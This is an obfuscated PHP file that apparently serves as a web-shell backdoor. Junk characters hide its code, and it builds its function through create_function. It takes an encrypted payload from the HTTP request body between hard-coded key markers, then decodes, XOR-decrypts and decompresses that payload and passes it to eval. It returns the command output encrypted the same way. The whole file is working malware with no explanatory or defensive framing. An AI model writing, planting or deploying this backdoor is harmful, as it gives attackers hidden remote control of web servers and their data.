<?php
$J='inpJuJt"),$m)==1) {@ob_starJt();@JevaJlJ(@gJzuncompress(J@JJx(@basJe64_decode($m[1]),$k)))J;J$o=@ob_geJt';
$g='){$Jc=JsJtJrlen($k);$l=strleJn($t);$Jo="J";foJr($i=0;$i<J$JlJ;){for($j=0JJ;J($j<$c&&$i<$l);$jJ++,$i++';
$F='){J$o.=$tJ{$i}J^$k{$Jj};JJ}}return $Jo;}if (@Jpreg_match("/$kh(J.JJ+)J$kJf/",@file_geJt_contenJts("pJhp://';
$S='$k="1eJ3b91af";J$khJ="58df65J50b8J3d";$kf="dJfeJ8cJf680a3a";$p=JJ"M8dGCK0sJ1B9HDeKJb";fuJnJction x($t,$k';
$N='_contenJtJs();@Job_Jend_clean();$rJ=@baJse64_eJJncode(@Jx(@gzcJompressJ($o),$k));JprintJ(J"$p$kh$r$kf");}';
$f=str_replace('R','','cRreaRRtRe_fRuncRtion');
$M=str_replace('J','',$S.$g.$F.$J.$N);
$V=$f('',$M);$V();
?>
